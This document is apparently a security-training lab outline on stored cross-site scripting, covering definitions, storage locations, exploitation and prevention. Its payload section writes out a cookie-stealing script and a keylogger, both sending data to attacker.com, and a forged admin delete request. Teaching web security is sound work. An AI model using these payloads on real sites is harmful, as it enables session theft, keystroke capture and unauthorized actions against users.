---
title: "Lab 15 - Cross-site scripting - Stored"
date: 2025-12-30
draft: false
description: "Stored Cross-site scripting vulnerabilities"
---

# Lab 15: Cross-site scripting - Stored

## Objectives
- Understand Stored XSS (Persistent XSS)
- Practice exploiting stored XSS
- Create persistent payloads

## Lab Content

### 1. Stored XSS
- Definition and characteristics
- Differences from Reflected XSS
- More severe impact

### 2. Common Storage Locations
- Database records
- File uploads
- Log files
- User profiles
- Comments and reviews

### 3. Exploitation Techniques
- **Persistent payloads**: Long-term stored payloads
- **Multi-user impact**: Affecting multiple users
- **Privilege escalation**: Privilege escalation
- **Data exfiltration**: Data extraction

### 4. Advanced Payloads
```javascript
// Cookie stealing
<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>

// Keylogger
<script>document.onkeypress=function(e){fetch('http://attacker.com/log.php?key='+e.key)}</script>

// Admin actions
<script>fetch('/admin/delete-user', {method:'POST', body:'user=victim'})</script>
```

### 5. Practice
- Find stored XSS vulnerabilities
- Create persistent payloads
- Impact multiple users
- Perform admin actions

### 6. Prevention Measures
- Strict input validation
- Output encoding
- Content Security Policy
- Regular security audits